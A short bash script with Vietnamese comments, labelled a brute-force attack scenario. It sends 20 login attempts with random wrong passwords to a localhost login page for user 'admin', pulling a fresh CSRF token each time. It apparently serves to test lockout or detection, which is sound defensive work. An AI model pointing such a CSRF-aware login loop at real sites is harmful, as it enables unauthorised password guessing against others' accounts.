#!/bin/bash
set -e

TARGET="https://localhost/login.php"
USER="admin"
COOKIE_JAR="/tmp/bf_cookie.txt"

echo "=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG BRUTE FORCE VÀO TRANG ĐĂNG NHẬP ==="
echo "Mục tiêu: $TARGET | Tài khoản nhắm tới: $USER"
echo "Số lần thử: 20 lần với mật khẩu sai liên tiếp..."
echo ""

for i in $(seq 1 20); do
  # 1. Lấy trang login để trích xuất CSRF Token
  CSRF_TOKEN=$(curl -k -s -c "$COOKIE_JAR" "$TARGET" | grep -oP '(?<=name="csrf_token" value=")[^"]*' | head -n 1 || true)
  
  # Mật khẩu sai ngẫu nhiên
  FAKE_PASS="WrongPass_${i}_$RANDOM"
  
  # 2. Gửi request POST đăng nhập sai
  HTTP_CODE=$(curl -k -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null -w "%{http_code}" \
    -d "username=$USER&password=$FAKE_PASS&csrf_token=$CSRF_TOKEN" \
    -X POST "$TARGET")
  
  echo "[$i/20] Đã gửi request đăng nhập sai (Pass: $FAKE_PASS) -> HTTP Status: $HTTP_CODE"
  sleep 0.4
done

echo ""
echo "=== KỊCH BẢN BRUTE FORCE HOÀN TẤT ==="
